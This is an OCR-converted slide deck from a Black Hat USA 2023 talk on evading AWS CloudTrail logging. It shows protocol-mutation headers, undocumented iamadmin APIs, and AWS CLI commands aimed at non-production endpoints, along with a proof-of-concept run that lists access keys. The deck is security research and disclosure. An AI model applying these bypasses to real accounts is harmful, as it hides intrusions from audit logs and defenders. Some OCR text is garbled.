---
title: "Evading Logging in the Cloud Bypassing AWS CloudTrail"
speakers: ["Nick Frichette"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Nick Frichette_Evading Logging in the Cloud Bypassing AWS CloudTrail.pdf"
pages: 46
sha256: "307b9dc27bf7010ffc48562854d53ef062c971a4c8c87555afa67f85dd18c475"
text_chars: 12281
ocr_pages: 19
has_ocr: true
redacted_secrets: 2
ocr_confidence: 86.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:17:20Z"
---
# Evading Logging in the Cloud Bypassing AWS CloudTrail

**Speakers:** Nick Frichette  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Nick Frichette_Evading Logging in the Cloud Bypassing AWS CloudTrail.pdf` (46 pages)


## Slide 1

**Evading Logging in the** TItitltet **Cloud: B** **yp assin** **g AWS** **CloudTrail**

Nick Frichette

## Slide 2

Nick Frichette Senior Security Researcher @

- Created https://hackingthe.cloud, an open source encyclopedia of cloud tradecraft

- Finder of AWS vulns

- Developed animosity to CloudTrail from his pentesting days

2

## Slide 3

#### **Talk Roadma** **p**

- What is CloudTrail?

- Introduction to AWS API internals

Protocol Mutation

Undocumented APIs

Non-Production Endpoints

3

## Slide 4

#### **What is AWS CloudTrail?**

Create Admin
IAM User
EC2 Instance
IAM

Identity
Date/Time
API Service/Action
Region
IP Address/User Agent

Request Parameters

4

## Slide 5

#### **What is AWS CloudTrail?**

Create Admin
IAM User
EC2 Instance
IAM
C2

Identity
Date/Time
API Service/Action
Region
IP Address/User Agent

Request Parameters 5

## Slide 6

#### **What is AWS CloudTrail?**

Create Admin
IAM User
EC2 Instance
IAM
C2

Identity
Date/Time
API Service/Action
Region
IP Address/User Agent

Request Parameters

6

## Slide 7

#### **Victim POV:**

7

**[...snip…]**

## Slide 8

#### **Victim POV:**

8

**[...snip…]**

## Slide 9

#### **Intro to the AWS API**

9

**[...snip…]**


> Recovered by OCR — confidence 82/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekhat Intro to the AWS API
"version":"2.0",
"metadata":{
"apiVersion":"2017-10-17",
"jJsonVersion":"1.1",
"protocol":"json",
"serviceFullLName":"AWS Secrets Manager",
"signatureVersion": "v4",
"signingName": "secretsmanager",
"targetPrefix":"secretsmanager",
```

## Slide 10

#### **Intro to the AWS API**

10

**[...snip…]**


> Recovered by OCR — confidence 83/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekhat Intro to the AWS API
"version":"2.0",
"metadata":{
"apiVersion":"2017-10-17",
"jJsonVersion":"1.1",
"protocol":"json",
“serviceFulltName : AWS Secrets Manager",
"signatureVersion": "v4",
"signingName": "secretsmanager",
"targetPrefix":"secretsmanager",
```

## Slide 11

## **AWS API Protocols**

rest-json rest-xml JSON 1.0 JSON 1.1 query EC2

11


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
Pretty Raw Hex >
3§X-Amz—-Target: secretsmanager.ListSecrets
4§Content-Type: application/x—amz—json-1.1
ul
command/secretsmanager. list-secrets
6 X-Amz—-Date: 20230714T204034Z
7 X-Amz-Security-Token: IQoJb3JpZ2... [snip]
8 Content-Length: 2
9 Connection: close
}
rest-json
rest-xml
JSON 1.0
JSON 1.1
query
EC2
```

## Slide 12

#### **Bypassing AWS CloudTrail**

Protocol Mutation

Undocumented  Non-Production
APIs Endpoints

12

## Slide 13

## **Mutatin** **g Protocol In** **p uts**

**application/x-amz-json-1.0**

###### **JSON 1.1 API**

13

## Slide 14

## **Mutatin** **g Protocol In** **p uts**

**application/x-amz-json-1.0 JSON 1.1 API**

|**Has**|**Permission?**|**Header**|**Response**|**Logged to CloudTrail?**|
|---|---|---|---|---|
|Yes||1.0|404|No|
|No||1.0|403|No|
||**With Permission:**||||
||**Without Permissio**|**n:**|||

14

## Slide 15

## **Mutatin** **g Protocol In** **p uts**

**application/x-amz-json-1.0 JSON 1.1 API**

|**Has**|**Permission?**|**Header**|**Response**|**Logged to CloudTrail?**|
|---|---|---|---|---|
|Yes||1.0|404|No|
|No||1.0|403|No|
||**With Permission:**||||
||**Without Permissio**|**n:**|||

15

## Slide 16

## **Mutatin** **g Protocol In** **p uts**

**application/x-amz-json-1.0 JSON 1.1 API**

|**Has**|**Permission?**|**Header**|**Response**|**Logged to CloudTrail?**|
|---|---|---|---|---|
|Yes||1.0|404|No|
|No||1.0|403|No|
||**With Permission:**||||
||**Without Permissio**|**n:**|||

16

## Slide 17

## **Mutatin** **g Protocol In** **p uts**

**application/x-amz-json-1.0 JSON 1.1 API**

|**Has Permission?**|**Header**|**Response**|**Logged to CloudTrail?**|
|---|---|---|---|
|Yes|1.0|404|No|
|No|1.0|403|No|

###### **Affected 645 actions across 40 services**

source: frichetten.com/blog/aws-api-enum-vuln/

17

## Slide 18

## **Enumerating Permissions**

AWS Services

AWS Access
Keys

- **Attackers have limited options to**

Steals

**enumerate permissions.**

**Bruteforcing is commonly detected.**

18

## Slide 19

## **Enumerating Permissions**

- **Attackers have limited options to enumerate permissions.**

**github.com/andresriancho/enumerate-iam**

- **Bruteforcing is commonly detected.**

19

## Slide 20

## **Enumerating Permissions**

AWS Access  AWS Services
Keys
Steals

**Attackers have limited options to**

**enumerate permissions.**

**Bruteforcing is commonly detected.**

20

## Slide 21

## **Enumerating Permissions**

AWS Access  AWS Services
Keys

**Attackers have limited options to**

Steals

**enumerate permissions.**

**Bruteforcing is commonly detected.**

21

## Slide 22

**Enumerating Permissions**

-
-

- **Attackers have limited options to enumerate permissions.**

- **Bruteforcing is commonly detected.**

**github.com/Frichetten/aws_stealth_perm_enum**

22

## Slide 23

#### **Bypassing AWS CloudTrail**

Protocol Mutation Non-Production
Endpoints
Undocumented
APIs

23


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing AWS CloudfTrail
g #
Protocol Mutation Non-Production
Endpoint
Undocumented nepoin's
APIs
23
```

## Slide 24

# **Undocumented APIs**

24

## Slide 25

# **Undocumented APIs**

source: frichetten.com/blog/minor-cross-tenant-vulns-app-runner/

25


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Undocumented APIs
Two Minor Cross-Tenant Vulnerabilities
in AWS App Runner
April 3, 2023
This is part 2ina of blog posts about a research project | am conducting in my free time
on undocumented AWS APIs and their security impacts.
source: frichetten.com/blog/minor-cross-tenant-vulns-app-runner/
25
```

## Slide 26

# **Undocumented APIs**

26


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Undocumented APIs
AWS Management Console
Everything you need to access and manage the AWS Cloud — in one web interface
Log back in
26
```

## Slide 27

# **iamadmin**

27


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
lamadmin
X Headers Payload Preview Response Initiator Timing Cookies
General
Request URL: https://us-east-1.console.aws.amazon.com/iamv2/api/iamadmin
Request Method: POST
Status Code: @200
Remote Address: 3.3.9.1:443
"contentString":"{\"UserNames\": [\"user1\", \"user2\",\"user3\"] }"
```

## Slide 28

28


> Recovered by OCR — confidence 70/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AMAdminServices = i.strEnum(['ListPoliciesForGroups’,
w
"ListMFADevicesForMultipleUsers',
"ListServiceLinkedRoleDeletionAttempts',
t. IAMAdminDefaultResponse = Promise. resolve({
ReennnceMan: £
28
```

## Slide 29

### **iamadmin:ListAccessKeysForMultipleUsers**

29


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
lamadmin:ListAccessKeysForMultipleUsers
"ErrorMap": {
"no-perm": [
"ErrorCode": 403,
mearorMessage": "User: arn:awS:iam::111111111111:user/noperm is not authorized to perform:
iam:ListAccessKeys|pn resource: no-perm because no identity-based policy allows the iam:ListAccessKeys action"
]
"ResponseMap": {}
```

## Slide 30

Mapping undocumented iamadmin actions to normal IAM actions

30


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mapping
undocumented
lamadmin actions
to normal IAM
actions
iamadmin method
ListPoliciesForGroups
ListAttachedPoliciesForGroups
GetGroupMembershipCounts
ListGroupsForUsers
ListAccessKeysForMultipleUsers
ListAccessKeyLastUsedForMultipleAccessKeys
GetLoginProfilesForMultipleUsers
ListDescriptionsForPolicies
BatchGetRoleLastUsed
ListMFADevicesForMultipleUsers
ListSigningCertificatesForMultipleUsers
ListServiceLinkedRoleDeletionAttempts
GetServiceLinkedRoleTemplate
Equivalent IAM method
iam:ListGroupPolicies
iam:ListAttachedGroupPolicies
iam:GetGroup
iam:ListGroupsForUser
iam:ListAccessKeys
iam:GetAccessKeyLastUsed
iam:GetLoginProfile
iam:ListPolicies
iam:GetRole
iam:ListMFADevices
iam:ListSigningCertificates
iam:GetServiceLinkedRoleDeletionStatus
iam:GetServiceLinkedRoleTemplate
```

## Slide 31

Mapping undocumented iamadmin actions to normal IAM actions

31


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mapping
undocumented
lamadmin actions
to normal IAM
actions
iamadmin method
ListPoliciesForGroups
ListAttachedPoliciesForGroups
GetGroupMembershipCounts
ListGroupsForUsers
ListAccessKeysForMultipleUsers
ListAccessKeyLastUsedForMultipleAccessKeys
GetLoginProfilesForMultipleUsers
ListDescriptionsForPolicies
BatchGetRoleLastUsed
ListMFADevicesForMultipleUsers
ListSigningCertificatesForMultipleUsers
ListServiceLinkedRoleDeletionAttempts
GetServiceLinkedRoleTemplate
Equivalent IAM method
iam:ListGroupPolicies
iam:ListAttachedGroupPolicies
iam:GetGroup
iam:ListGroupsForUser
iam:ListAccessKeys
iam:GetAccessKeyLastUsed
iam:GetLoginProfile
iam:ListPolicies
iam:GetRole
iam:ListMFADevices
iam:ListSigningCertificates
iam:GetServiceLinkedRoleDeletionStatus
iam:GetServiceLinkedRoleTemplate
```

## Slide 32

Mapping undocumented iamadmin actions to normal IAM actions

32


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mapping
undocumented
lamadmin actions
to normal IAM
actions
iamadmin method
ListPoliciesForGroups
ListAttachedPoliciesForGroups
GetGroupMembershipCounts
ListGroupsForUsers
ListAccessKeysForMultipleUsers
ListAccessKeyLastUsedForMultipleAccessKeys
GetLoginProfilesForMultipleUsers
ListDescriptionsForPolicies
BatchGetRoleLastUsed
ListMFADevicesForMultipleUsers
ListSigningCertificatesForMultipleUsers
ListServiceLinkedRoleDeletionAttempts
GetServiceLinkedRoleTemplate
Equivalent IAM method
iam:ListGroupPolicies
iam:ListAttachedGroupPolicies
iam:GetGroup
iam:ListGroupsForUser
iam:ListAccessKeys
iam:GetAccessKeyLastUsed
iam:GetLoginProfile
iam:ListPolicies
iam:GetRole
iam:ListMFADevices
iam:ListSigningCertificates
iam:GetServiceLinkedRoleDeletionStatus
iam:GetServiceLinkedRoleTemplate
```

## Slide 33

# **iamadmin**

33


> Recovered by OCR — confidence 77/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nick. frichette@machine tamadmin-ct-bypass-pocs % ./list
access_key_cloudtrail_bypass.py
Request method:
sers
“ErrorMap":
“ResponseMap"
AccessKeyId": "“AKIA[REDACTED:aws-access-key-id]
‘CreateDate
"UserName": "tester"
>
essKeyId": “AKIA[REDACTED:aws-access-key-id]"
"Status": ctive”
```

## Slide 34

#### **Bypassing AWS CloudTrail**

Protocol Mutation Undocumented
APIs
Non-Production
Endpoints

34

## Slide 35

**<service>.<region>.amazonaws.com**

**Example: secretsmanager.us-east-1.amazonaws.com**

35

## Slide 36

###### **Example non-production endpoints**

- forecast-preprod.us-east-1.amazonaws.com

- ssm-gamma.us-west-1.amazonaws.com

- route53resolver-beta.us-east-1.amazonaws.com

- cloudsearch-staging.us-east-1.amazonaws.com

- rds-preview.us-east-2.amazonaws.com

- ssm-facade.eu-west-1.amazonaws.com

- sonic.us-east-1.amazonaws.com

- legacy.ssm.us-east-1.amazonaws.com

36

## Slide 37

aws kms list-keys --endpoint-url https://kms-a.us-east-1.amazonaws.com

**kms-a.us-east-1.amazonaws.com**

Tested using AWS CLI: aws-cli/2.11.7 Python/3.11.2 Darwin/22.4.0 exe/x86_64 prompt/off

37

## Slide 38

38


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nick. frichette@COMP-VX7FIJ4Q@QHG .aws % aws sns List-topics \
> --region us-east-2
"Topics": [
"TopicArn": "arn:aws:sns:us-east-2:! :security_aLerting"
}
]
}
nick. frichette@COMP-VX7FJ4Q@QHG .aws % aws sns List-topics \
> --region us-east-2 \
> --endpoint-url https://sns-gamma.us-east-2.amazonaws.com
"Topics": []
}
nick. frichette@COMP-VX7FJ4QQHG .aws % fj
```

## Slide 39

###### **Enumerating permissions silently**

**Only 1 event showing in CloudTrail**

39


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Event history (1) info
Event history shows you the last 90 days of management events.
Lookup attributes
User name Q auto-user Xx | | Last 1 hour
Event name Event time User name Event source
ListTopics June 08, 2023, 17:05:05 (UTC-0... auto-user sns.amazonaws.com
Only 1 event showing in CloudTrail
```

## Slide 40

###### **Event Source Obfuscation**

40


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Q nick. frichette@COMP-VX7FJ4QQHG /tmp % aws ivs list-channels \
t i | I + > --region ap-northeast-1
"channels": [
"arn": "arn:aws:ivs:ap-northeast-1: :channel/rra94t9j3bsE",
"authorized": false,
"LatencyMode": "LOW",
"tags": {}
}
nick. frichette@COMP-VX7FJ4QQHG /tmp % aws ivs List-channels \
Event Sou rce > --reqgion gp-northeast-1 \
> --endpoint-url https://ivs-gamma.ap-northeast-1.amazonaws .com
Obfuscation "channels": [
"arn": "arn:aws:ivs:ap-northeast-1: :channel/rra94t9j3bsE",
"authorized": false,
"LatencyMode": "LOW",
"name": "",
"recordingConfigurationArn": "",
"tags": {}
}
]
}
nick. frichette@COMP-VX7FJ4QQHG /tmp % |
```

## Slide 41

41


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Event history (2) info
Event history shows you the last 90 days of management events.
Lookup attributes
User name vy | Q auto-user
Event name Event time User name Event source
gamma-
June 06, 2023, 13:41:25 (UTC-O... auto-user starfrult.amazonaws.co
June 06, 2023, 13:41:19 (UTC-O... auto-user
```

## Slide 42

##### **Non-production endpoints can bypass CloudTrail**

**aws242-servicecatalog-gamma.us-east-1.amazonaws.com**

42


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
¥. Security Labs
Non-production
RESEARCH
endpoints can Bypassing CloudTrail in AWS Service
bypass CloudTrai| Catalog, and Other Logging Research
March 20, 2023
SECURITY AWS SECURITY RESEARCH
aws242-servicecatalog .uS-east-1.amazonaws.com
42
```

## Slide 43

###### **Automate Bypass Discovery**

43


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Automate Bypass Discovery ~
SQs:
Certspotter CloudTrail Lambda: certspotter ASG: AWS
EC2 Ingester Bypass Aan ec2 scaleout oF
Potential Identifier Fingerprinter
Queue queue
Table: Table:
certspotter certspotter
positive identified
findings endpoint
43
```

## Slide 44

**prod: events.us-east-1.amazonaws.com**

**non-prod: events-b.us-east-1.amazonaws.com**

44

## Slide 45

###### **Protocol Mutation**

###### **Undocumented APIs**

###### **Non-production Endpoints**

45

## Slide 46

Nick Frichette Senior Security Researcher @

- https://hackingthe.cloud

- Twitter: @frichette_n

- Mastodon: @frichetten@fosstodon.org

46
